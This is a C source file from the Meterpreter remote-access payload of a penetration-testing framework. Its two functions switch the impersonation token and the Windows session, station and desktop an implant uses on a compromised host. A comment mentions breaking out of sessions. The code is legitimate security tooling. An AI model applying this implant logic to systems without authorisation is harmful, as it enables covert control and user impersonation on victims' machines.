/*!
 * @file core.c
 * @brief Definitions of core components of the Meterpreter suite.
 * @details Much of what exists in the core files is used in almost every area
 *          of the Meterpreter code base, and hence it's very important. Don't
 *          change this stuff unless you know what you're doing!
 */
#include "metsrv.h"
#include "common_exports.h"
#include "packet_encryption.h"
#include <winhttp.h>

/*!
 * @todo I have no idea why this is here, need someone else to explain.
 */
HANDLE core_update_thread_token(Remote *remote, HANDLE token)
{
	HANDLE temp = NULL;

	lock_acquire(remote->lock);
	do
	{
		temp = remote->thread_token;

		// A NULL token resets the state back to the server token
		if (!token)
		{
			token = remote->server_token;
		}

		// Assign the thread token
		remote->thread_token = token;

		// Close the old token if its not one of the two active tokens
		if (temp && temp != remote->server_token && temp != remote->thread_token)
		{
			CloseHandle(temp);
		}
	} while (0);

	lock_release(remote->lock);
	return(token);
}

/*!
 * @brief Update the session/station/desktop to be used by multi threaded meterpreter for desktop related operations.
 * @details We dont store the handles as it is more convienient to use strings, especially as we cant use the regular API
 *          to break out of sessions.
 * @remark It is up to the caller to free any station/desktop name provided as internally we use \c strdup.
 * @param remote Pointer to the remote connection.
 * @param dwSessionID ID of the session which contains the window station in \c cpStationName.
 * @param cpStationName Name of the window station that contains the desktop in \c cpDesktopName.
 * @param cpDesktopName Name of the desktop to switch to.
 */
VOID core_update_desktop(Remote * remote, DWORD dwSessionID, char * cpStationName, char * cpDesktopName)
{
	DWORD temp_session = -1;
	char * temp_station = NULL;
	char * temp_desktop = NULL;

	lock_acquire(remote->lock);

	do
	{
		temp_session = remote->curr_sess_id;

		// A session id of -1 resets the state back to the servers real session id
		if (-1 == dwSessionID)
		{
			dwSessionID = remote->orig_sess_id;
		}

		// Assign the new session id
		remote->curr_sess_id = dwSessionID;

		temp_station = remote->curr_station_name;

		// A NULL station resets the station back to the origional process window station
		if (!cpStationName)
		{
			cpStationName = remote->orig_station_name;
		}

		// Assign the current window station name to use
		remote->curr_station_name = _strdup(cpStationName);

		// free the memory for the old station name  if its not one of the two active names
		if (temp_station && temp_station != remote->orig_station_name && temp_station != remote->curr_station_name)
		{
			free(temp_station);
		}

		temp_desktop = remote->curr_desktop_name;

		// A NULL station resets the desktop back to the origional process desktop
		if (!cpDesktopName)
		{
			cpDesktopName = remote->orig_desktop_name;
		}

		// Assign the current window desktop name to use
		remote->curr_desktop_name = _strdup(cpDesktopName);

		// free the memory for the old desktop name if its not one of the two active names
		if (temp_desktop && temp_desktop != remote->orig_desktop_name && temp_desktop != remote->curr_desktop_name)
		{
			free(temp_desktop);
		}

	} while (0);

	lock_release(remote->lock);
}
